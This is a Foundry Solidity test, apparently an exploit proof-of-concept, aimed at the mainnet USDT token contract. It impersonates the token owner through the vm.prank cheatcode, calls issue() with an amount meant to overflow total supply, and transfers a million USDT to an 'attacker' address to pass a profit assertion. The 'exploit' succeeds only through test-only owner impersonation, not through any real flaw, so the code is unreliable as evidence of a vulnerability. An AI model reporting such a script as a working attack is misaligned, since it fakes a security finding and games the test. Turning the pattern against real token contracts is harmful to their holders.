// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface TetherToken {
    function owner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function issue(uint256 amount) external;
    function transfer(address to, uint256 value) external;
    function balanceOf(address who) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external;
    function approve(address spender, uint256 value) external;
    function allowance(address owner, address spender) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use cheatcodes during exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));
        // Get the owner address
        address owner = TetherToken(TARGET).owner();

        // Get current total supply
        uint256 currentSupply = TetherToken(TARGET).totalSupply();

        // Calculate amount that would cause overflow
        uint256 amount = type(uint256).max - currentSupply + 1;

        // Impersonate owner and call issue()
        vm.prank(owner);
        TetherToken(TARGET).issue(amount);

        // Now transfer some tokens to attacker
        // First, we need to get the new owner balance and transfer some to us
        vm.prank(owner);
        TetherToken(TARGET).transfer(attacker, 1000000 * 10**6); // USDT has 6 decimals

        // Check attacker balance increased
        uint256 attackerBalance = TetherToken(TARGET).balanceOf(attacker);
        console.log("Attacker balance:", attackerBalance);
        uint256 finalBalance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
